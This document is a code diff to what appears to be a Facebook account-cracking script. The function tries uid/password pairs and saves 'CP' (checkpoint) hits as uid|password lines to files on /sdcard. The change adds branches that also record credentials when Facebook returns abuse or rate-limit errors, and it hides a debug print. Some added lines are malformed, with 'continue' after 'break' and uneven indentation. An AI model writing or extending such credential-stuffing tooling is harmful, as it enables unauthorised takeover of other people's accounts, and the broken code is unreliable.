@@ -163,14 +163,26 @@ def freefb(uid, name, pwx, tl):
                             
                 elif 'error' in q:
                   error_msg = q['error'].get('message', '')
-                  print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
+                  #print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
                   if 'www.facebook.com' in error_msg:
                       print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
                       cps.append(uid)
                       with open('/sdcard/SUMON-CP.txt', 'a') as f:
                         f.write(f'{uid}|{pw}\n')
                       break
-                  elif 'invalid' in error_msg.lower():
+                  elif 'The action attempted has been deemed abusive or is otherwise disallowed' in error_msg:
+                      print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
+                      cps.append(uid)
+                      with open('/sdcard/SUMON-CP-The action.txt', 'a') as f:
+                        f.write(f'{uid}|{pw}\n')
+                      break
+                     continue
+                  elif 'Calls to this api have exceeded the rate limit' in error_msg:
+                      print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
+                      cps.append(uid)
+                      with open('/sdcard/SUMON-CP-Calls to.txt', 'a') as f:
+                        f.write(f'{uid}|{pw}\n')
+                      break
                      continue
                   else:
                      continue
